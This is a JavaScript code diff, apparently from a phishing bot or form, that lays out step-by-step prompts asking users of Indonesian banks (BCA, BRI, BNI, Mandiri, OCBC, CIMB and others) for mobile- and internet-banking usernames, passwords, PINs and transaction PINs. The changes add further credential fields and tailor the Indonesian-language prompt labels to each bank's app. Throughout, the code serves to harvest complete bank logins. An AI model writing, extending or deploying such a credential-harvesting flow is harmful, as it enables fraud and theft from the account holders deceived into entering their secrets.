@@ -22,15 +22,19 @@ const getSteps = (bank) => {
   const b = (bank || '').toUpperCase();
 
   if (b === 'BCA') {
-    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword'];
+    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword', 'ibPin'];
   } else if (b === 'BRI') {
     bankSteps = ['jenisRekening', 'brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
   } else if (b === 'BNI') {
-    bankSteps = ['pinWondr', 'passWondr', 'mobileUser', 'mobilePassword'];
+    // BNI Wondr: stored in mobileUser/mobilePassword/mobilePin + ibUser/ibPassword/ibPin
+    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
+  } else if (b === 'MANDIRI') {
+    // Mandiri Livin: stored in mobileUser/mobilePassword/mobilePin + ibUser/ibPassword/ibPin
+    bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   } else if (b === 'OCBC' || b === 'OCBC NISP') {
-    bankSteps = ['ocbcNyalaUser', 'mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
+    bankSteps = ['ocbcNyalaUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   } else if (b !== '') {
-    // Mandiri, Danamon, etc.
+    // CIMB, PERMATA, BTN, DANAMON, dan bank lainnya
     bankSteps = ['mobileUser', 'mobilePassword', 'mobilePin', 'ibUser', 'ibPassword', 'ibPin'];
   }
 
@@ -77,43 +81,56 @@ const getBankSpecificLabel = (field, bankName) => {
 
   // Dynamic Labels based on field and bank
   if (field === 'mobileUser') {
+    if (bank === 'BNI') return '👤 Masukkan User Wondr (BNI):';
     if (bank === 'MANDIRI') return "👤 Masukkan User Livin' by Mandiri:";
-    if (bank === 'BNI') return "👤 Masukkan User BNI Mobile Banking:";
-    if (bank === 'DANAMON') return "👤 Masukkan User D-Bank PRO:";
-    if (bank === 'OCBC' || bank === 'OCBC NISP') return "👤 Masukkan User One Mobile (OCBC):";
-    if (bank === 'PERMATA') return "👤 Masukkan User PermataMobile X:";
-    if (bank === 'MAYBANK') return "👤 Masukkan User M2U (Maybank):";
-    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return "👤 Masukkan User OCTO Mobile:";
-    return "👤 Masukkan Username Mobile Banking:";
+    if (bank === 'DANAMON') return '👤 Masukkan User D-Bank PRO:';
+    if (bank === 'PERMATA') return '👤 Masukkan User PermataMobile X:';
+    if (bank === 'MAYBANK') return '👤 Masukkan User M2U (Maybank):';
+    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return '👤 Masukkan User OCTO Mobile (CIMB):';
+    return '👤 Masukkan Username Mobile Banking:';
   }
 
   if (field === 'mobilePassword') {
+    if (bank === 'BNI') return '🔑 Masukkan Password Wondr (BNI):';
     if (bank === 'MANDIRI') return "🔑 Masukkan Password Livin' by Mandiri:";
-    if (bank === 'BNI') return "🔑 Masukkan MPIN/Password BNI Mobile:";
-    if (bank === 'DANAMON') return "🔑 Masukkan Password D-Bank PRO:";
-    if (bank === 'OCBC' || bank === 'OCBC NISP') return "🔑 Masukkan Password One Mobile (OCBC):";
-    if (bank === 'PERMATA') return "🔑 Masukkan Password PermataMobile X:";
-    if (bank === 'MAYBANK') return "🔑 Masukkan Password M2U (Maybank):";
-    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return "🔑 Masukkan Password OCTO Mobile:";
-    return "🔑 Masukkan Password Mobile Banking:";
+    if (bank === 'DANAMON') return '🔑 Masukkan Password D-Bank PRO:';
+    if (bank === 'OCBC' || bank === 'OCBC NISP') return '🔑 Masukkan Password Nyala (OCBC):';
+    if (bank === 'PERMATA') return '🔑 Masukkan Password PermataMobile X:';
+    if (bank === 'MAYBANK') return '🔑 Masukkan Password M2U (Maybank):';
+    if (bank === 'CIMB' || bank === 'CIMB NIAGA') return '🔑 Masukkan Password OCTO Mobile (CIMB):';
+    return '🔑 Masukkan Password Mobile Banking:';
   }
 
   if (field === 'mobilePin') {
-    if (bank === 'BRI') return "🔢 Masukkan PIN BRImo:";
+    if (bank === 'BNI') return '🔢 Masukkan PIN Wondr (BNI):';
+    if (bank === 'BRI') return '🔢 Masukkan PIN BRImo:';
     if (bank === 'MANDIRI') return "🔢 Masukkan PIN Livin' by Mandiri:";
-    return "🔢 Masukkan PIN Mobile Banking:";
+    if (bank === 'OCBC' || bank === 'OCBC NISP') return '🔢 Masukkan PIN Nyala (OCBC):';
+    return '🔢 Masukkan PIN Mobile Banking:';
   }
 
   if (field === 'ibUser') {
-    if (bank === 'BCA') return "👤 Masukkan User KlikBCA (IB):";
-    if (bank === 'OCBC' || bank === 'OCBC NISP') return "👤 Masukkan User Internet Banking (OCBC):";
-    return "👤 Masukkan Username Internet Banking:";
+    if (bank === 'BCA') return '👤 Masukkan User KlikBCA (Internet Banking):';
+    if (bank === 'BNI') return '👤 Masukkan User Internet Banking BNI:';
+    if (bank === 'MANDIRI') return '👤 Masukkan User Internet Banking Mandiri:';
+    if (bank === 'OCBC' || bank === 'OCBC NISP') return '👤 Masukkan User Internet Banking OCBC:';
+    return '👤 Masukkan Username Internet Banking:';
   }
 
   if (field === 'ibPassword') {
-    if (bank === 'BCA') return "🔑 Masukkan PIN KlikBCA (IB):";
-    if (bank === 'OCBC' || bank === 'OCBC NISP') return "🔑 Masukkan Password Internet Banking (OCBC):";
-    return "🔑 Masukkan Password Internet Banking:";
+    if (bank === 'BCA') return '🔑 Masukkan PIN KlikBCA (Internet Banking):';
+    if (bank === 'BNI') return '🔑 Masukkan Password Internet Banking BNI:';
+    if (bank === 'MANDIRI') return '🔑 Masukkan Password Internet Banking Mandiri:';
+    if (bank === 'OCBC' || bank === 'OCBC NISP') return '🔑 Masukkan Password Internet Banking OCBC:';
+    return '🔑 Masukkan Password Internet Banking:';
+  }
+
+  if (field === 'ibPin') {
+    if (bank === 'BCA') return '🔢 Masukkan PIN Transaksi KlikBCA:';
+    if (bank === 'BNI') return '🔢 Masukkan PIN Internet Banking BNI:';
+    if (bank === 'MANDIRI') return '🔢 Masukkan PIN Internet Banking Mandiri:';
+    if (bank === 'OCBC' || bank === 'OCBC NISP') return '🔢 Masukkan PIN Internet Banking OCBC:';
+    return '🔢 Masukkan PIN Internet Banking:';
   }
 
   return labels[field] || `Masukkan ${field}:`;
